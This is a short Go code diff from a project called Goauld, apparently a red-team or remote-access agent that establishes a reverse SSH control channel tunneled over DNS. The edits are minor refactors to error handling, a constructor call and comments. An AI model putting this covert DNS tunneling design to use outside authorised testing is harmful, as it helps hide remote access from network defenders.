@@ -6,6 +6,7 @@ import (
 	"Goauld/agent/ssh/transport/blind"
 	"Goauld/agent/ssh/transport/dns"
 	"context"
+	"errors"
 	"fmt"
 	"net"
 	"time"
@@ -98,10 +99,10 @@ func (cpc *ControlPlanClient) InitPolling(success chan<- struct{}, chanErr chan<
 func (cpc *ControlPlanClient) InitControlOverDNSAlt(success chan<- struct{}, chanErr chan<- error) error {
 	dnsServers := dns.GetDNSServers()
 	if len(dnsServers) == 0 {
-		return fmt.Errorf("no DNS servers found")
+		return errors.New("no DNS servers found")
 	}
 
-	dnsClient, err := blind.NewDNSClient(config.Get().DNSServer(), config.Get().DNSDomainAlt(), true, "control", config.Get().ID)
+	dnsClient, err := blind.NewDNSClient(config.Get().DNSServer(), config.Get().DNSDomainAlt(), "control", config.Get().ID)
 	if err != nil {
 		log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
 
@@ -111,8 +112,8 @@ func (cpc *ControlPlanClient) InitControlOverDNSAlt(success chan<- struct{}, cha
 	go dnsClient.Tunnel(conn2)
 	log.Debug().Str("Mode", "DNSSH").Msg("Trying to mount SSH over the DNS connection")
 	// Write S tag to inform the incoming SSH traffic
-	//_, err = conn2.Write([]byte{'S'})
-	//if err != nil {
+	// _, err = conn2.Write([]byte{'S'})
+	// if err != nil {
 	//	log.Error().Str("Mode", "DNSSH").Err(err).Msg("Failed to init SSH stream over DNS")
 	//
 	//	return err
@@ -126,6 +127,7 @@ func (cpc *ControlPlanClient) InitControlOverDNSAlt(success chan<- struct{}, cha
 	// As the  control socket is established using DNS we consider that the only working protocol is DNS
 	// so we set the RSSH protocol order to only DNS
 	config.Get().SetRSSHOrder([]string{"DNS-ALT"})
+
 	return nil
 }
 
